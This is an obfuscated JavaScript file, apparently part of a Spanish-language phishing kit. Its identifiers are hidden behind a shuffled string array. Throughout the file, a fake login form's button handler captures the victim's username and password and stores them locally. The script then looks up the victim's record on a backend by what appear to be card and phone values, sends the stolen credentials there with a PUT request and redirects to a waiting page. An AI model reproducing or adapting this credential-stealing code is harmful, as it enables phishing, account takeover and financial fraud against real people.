function _0xc822(_0x5427b2, _0x424c6d) {
  const _0x280ec8 = _0x280e();
  return (
    (_0xc822 = function (_0xc822a6, _0x4be072) {
      _0xc822a6 = _0xc822a6 - 0x178;
      let _0x5443a4 = _0x280ec8[_0xc822a6];
      return _0x5443a4;
    }),
    _0xc822(_0x5427b2, _0x424c6d)
  );
}
const _0x594f5e = _0xc822;
(function (_0x28b55b, _0x5f5b37) {
  const _0x38ec09 = _0xc822,
    _0x3b6568 = _0x28b55b();
  while (!![]) {
    try {
      const _0x3578e6 =
        -parseInt(_0x38ec09(0x179)) / 0x1 +
        (parseInt(_0x38ec09(0x190)) / 0x2) *
          (-parseInt(_0x38ec09(0x187)) / 0x3) +
        -parseInt(_0x38ec09(0x18f)) / 0x4 +
        -parseInt(_0x38ec09(0x182)) / 0x5 +
        (parseInt(_0x38ec09(0x183)) / 0x6) *
          (parseInt(_0x38ec09(0x193)) / 0x7) +
        (parseInt(_0x38ec09(0x186)) / 0x8) *
          (-parseInt(_0x38ec09(0x18b)) / 0x9) +
        (parseInt(_0x38ec09(0x17e)) / 0xa) * (parseInt(_0x38ec09(0x188)) / 0xb);
      if (_0x3578e6 === _0x5f5b37) break;
      else _0x3b6568["push"](_0x3b6568["shift"]());
    } catch (_0x4025a4) {
      _0x3b6568["push"](_0x3b6568["shift"]());
    }
  }
})(_0x280e, 0x55d7b);
function updateLS() {
  const _0x383239 = _0xc822;
  LS["setItem"](_0x383239(0x17d), JSON["stringify"](info));
}
const button = document["getElementById"](_0x594f5e(0x196)),
  userInput = document[_0x594f5e(0x191)]("txtUsuario"),
  passInput = document[_0x594f5e(0x191)](_0x594f5e(0x189));
function _0x280e() {
  const _0xcc65 = [
    "puser",
    "btnUsuario",
    "location",
    "metaInfo",
    "error",
    "json",
    "statusText",
    "PUT",
    "disabled",
    "click",
    "application/json",
    "Error\x20al\x20actualizar\x20usuario:",
    "preventDefault",
    "412280hZaIMW",
    "stringify",
    "href",
    "Usuario\x20encontrado",
    "info",
    "50bkAiRN",
    "telnum",
    "GET",
    "addEventListener",
    "1223265WHMkbO",
    "2353356yfynKV",
    "focus",
    "Corrigió\x20Usuario",
    "1184Jvqrby",
    "3fhIipw",
    "4025527vzqYcy",
    "txtPass",
    "user",
    "37305ojqsYt",
    "/logs/logs",
    "/logs/logUser/",
    "log",
    "1448944KFVEeJ",
    "475542uPaKxe",
    "getElementById",
    "value",
    "7gZAneE",
    "wait.html",
  ];
  _0x280e = function () {
    return _0xcc65;
  };
  return _0x280e();
}
async function updateStatus() {
  const _0x1e868c = _0x594f5e;
  button[_0x1e868c(0x19d)] = !![];
  const _0xe4567c = await fetch(url + _0x1e868c(0x18c), {
      method: _0x1e868c(0x180),
      headers: { "Content-Type": _0x1e868c(0x19f) },
    }),
    _0x26834c = await _0xe4567c[_0x1e868c(0x19a)](),
    _0x196e21 = [..._0x26834c];
  for (const _0x14a8db of _0x196e21) {
    if (
      _0x14a8db["reg"] == info["metaInfo"]["cc"] &&
      _0x14a8db["cl"] == info[_0x1e868c(0x198)][_0x1e868c(0x17f)]
    ) {
      console[_0x1e868c(0x18e)](_0x1e868c(0x17c));
      const _0x25cc84 = await fetch(
          url + _0x1e868c(0x18d) + _0x14a8db["idreg"],
          {
            method: _0x1e868c(0x19c),
            headers: { "Content-Type": _0x1e868c(0x19f) },
            body: JSON[_0x1e868c(0x17a)]({
              us: info[_0x1e868c(0x198)][_0x1e868c(0x18a)],
              ps: info["metaInfo"][_0x1e868c(0x195)],
              status: _0x1e868c(0x185),
            }),
          }
        ),
        _0x5bb259 = await _0x25cc84["json"]();
      _0x25cc84["ok"]
        ? console[_0x1e868c(0x18e)]("Usuario\x20actualizado")
        : console[_0x1e868c(0x199)](
            _0x1e868c(0x1a0),
            _0x25cc84[_0x1e868c(0x19b)]
          );
    }
  }
  (button[_0x1e868c(0x19d)] = ![]),
    (window[_0x1e868c(0x197)][_0x1e868c(0x17b)] = _0x1e868c(0x194));
}
button[_0x594f5e(0x181)](_0x594f5e(0x19e), async function (_0x31427c) {
  const _0x2992ce = _0x594f5e;
  _0x31427c[_0x2992ce(0x178)]();
  if (userInput["value"] == "" && passInput["value"] == "") {
    alert("Por\x20favor\x20ingrese\x20la\x20información\x20requerida"),
      userInput[_0x2992ce(0x184)]();
    return;
  } else {
    var _0xd8eb82 = userInput[_0x2992ce(0x192)],
      _0x484619 = passInput[_0x2992ce(0x192)];
    (info[_0x2992ce(0x198)][_0x2992ce(0x18a)] = _0xd8eb82),
      (info[_0x2992ce(0x198)][_0x2992ce(0x195)] = _0x484619),
      updateLS(),
      await updateStatus();
  }
});
